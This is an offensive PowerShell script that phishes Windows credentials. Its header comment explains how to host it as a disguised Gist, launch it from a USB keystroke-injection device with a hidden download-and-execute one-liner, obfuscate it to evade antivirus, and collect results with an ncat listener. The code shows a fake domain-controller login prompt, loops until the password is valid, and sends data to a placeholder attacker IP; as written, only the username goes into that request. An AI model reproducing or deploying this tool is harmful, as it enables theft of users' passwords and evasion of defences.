<# 
NOTE: 
It does NOT requires Admin privileges to run! 
And remember also to remove comments and obfuscate the script with https://github.com/danielbohannon/Invoke-Obfuscation to be FUD

1) Upload this script as Secret Gist into Github (I renamed it login-antani.php)
2) Insert the attacker's IP in  $res = $wc.downloadString("http://###ATTACKER's IP###/antani/$username")
3) Use the Google Shortener to shorten the RAW version of it:
https://gist.githubusercontent.com/attacker/xxxxxxxxxxxxxx/raw/xxxxxxxxxxxxxx/login-antani.php
4) Add it to the Ducky script
		Delay
		Press:131+114
		PrintLine:powershell -nop -noni -w 1 -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')"
5) On the Attacker's VPS use the following cmd to listen for incoming creds:
	ncat -k -l -p 80 | tee creds.log
#>

function antani
{ 
[System.Reflection.Assembly]::LoadWithPartialName("System.web")
$cred = $Host.ui.PromptForCredential("Connection Lost with Domain Controller", "Please login again", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials("$full", "$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
 
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $username = $output.UserName
 $password = $output.password
 $domain = $output.Domain
 Send-Credentials($username, $password, $domain)
}

function Send-Credentials($username, $password, $domain)
{
 $wc = New-Object system.Net.WebClient;
 $username = [System.Web.HttpUtility]::UrlEncode($username);
 $res = $wc.downloadString("http://###ATTACKER's IP###/antani/$username")
}

antani
